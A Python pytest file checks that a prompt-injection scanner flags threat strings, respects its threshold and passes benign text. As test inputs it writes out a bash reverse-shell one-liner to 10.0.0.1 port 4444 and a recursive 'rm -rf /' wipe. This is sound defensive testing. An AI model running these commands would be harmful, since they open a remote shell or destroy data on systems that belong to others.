"""The intent scanner flags threat patterns above its threshold."""

from __future__ import annotations

import pytest

from graph_os.security.prompt_injection import PromptInjectionScanner


@pytest.mark.parametrize(
    "text",
    ["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "rm -rf / --no-preserve-root"],
)
def test_threats_are_malicious(text: str) -> None:
    assert PromptInjectionScanner(threshold=0.5).scan_text(text).is_malicious


@pytest.mark.parametrize("text", ["", "list the open pull requests"])
def test_benign_text_is_not_malicious(text: str) -> None:
    assert not PromptInjectionScanner().scan_text(text).is_malicious


def test_threshold_gates_the_verdict() -> None:
    text = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    assert not PromptInjectionScanner(threshold=1.01).scan_text(text).is_malicious
